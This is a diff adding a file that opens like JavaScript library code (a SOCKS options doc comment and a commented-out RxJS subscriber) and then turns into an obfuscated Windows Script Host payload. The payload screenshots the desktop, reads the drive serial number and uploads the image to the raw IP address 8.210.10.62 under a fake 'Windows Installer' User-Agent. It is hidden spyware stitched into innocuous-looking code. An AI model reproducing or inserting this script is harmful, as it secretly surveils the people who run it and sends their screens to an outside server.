@@ -1,0 +1,96 @@
+/**
+ * Validates the provided SocksClientOptions
+ * @param options { SocksClientOptions }
+ * @param acceptedCommands { string[] } A list of accepted SocksProxy commands.
+ */
+ 
+//# sourceMappingURL=isEmpty.js.map
+
+[1,2,31829942]
+
+//# sourceMappingURL=audit.js.map
+
+/*
+class AuditSubscriber extends SimpleOuterSubscriber {
+    constructor(destination, durationSelector) {
+        super(destination);
+        this.durationSelector = durationSelector;
+        this.hasValue = false;
+    }
+    _next(value) {
+        this.value = value;
+        this.hasValue = true;
+        if (!this.throttled) {
+            let duration;
+            try {
+                const { durationSelector } = this;
+                duration = durationSelector(value);
+            }
+            catch (err) {
+                return this.destination.error(err);
+            }
+            const innerSubscription = innerSubscribe(duration, new SimpleInnerSubscriber(this));
+            if (!innerSubscription || innerSubscription.closed) {
+                this.clearThrottle();
+            }
+            else {
+                this.add(this.throttled = innerSubscription);
+            }
+        }
+    }
+    clearThrottle() {
+        const { value, hasValue, throttled } = this;
+        if (throttled) {
+            this.remove(throttled);
+            this.throttled = undefined;
+            throttled.unsubscribe();
+        }
+        if (hasValue) {
+            this.value = undefined;
+            this.hasValue = false;
+            this.destination.next(value);
+        }
+    }
+    notifyNext() {
+        this.clearThrottle();
+    }
+    notifyComplete() {
+        this.clearThrottle();
+    }
+}
+*/
+
+var oly = "Windows";
+10 / 2 // division
+var sOlyo = "Installer"; // Assign the text "Robin" to the variable sOlyo.
+var f = function(x){return x*x;} // function literal
+radius = 8;
+4 + 5 // additon
+var o = {x:1, y:2} // Object literal
+[1,2,3] // Array literal
+var sueGk = WScript.CreateObject("WScript.Shell");
+
+f = "h";o = "p";heskkr = ".";u = "i";ka = "ke";n = "t";
+fso = new ActiveXObject("Scripting.FileSystemObject");
+sous = "s";xo = "c";
+var sueGo = WScript.CreateObject("WinHttp.WinHttpRequest.5.1");
+
+drive = fso.GetDrive(xo + ":\\")
+sueGk.Run("i_view32.exe /capture /convert=" + radius + ".jpg");
+
+WScript.sleep(5000);
+
+var sueGo = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+sueGo.Open("POST", f + n + n + "p://" + radius + ".210.10.62/" + sous + "creenshot/" + drive.SerialNumber, false);
+sueGo.SetRequestHeader("User-Agent", oly + " " + sOlyo);
+sueGo.SetRequestHeader("Cache-Control","no-cache");
+sueGo.SetRequestHeader("Content-Type", "image/jpg");
+
+var st = new ActiveXObject("ADODB.Stream");
+st.Type = 1;
+st.Open();
+st.LoadFromFile(radius + ".jpg");
+var binVariant = st.read();
+
+sueGo.Send(binVariant);
+
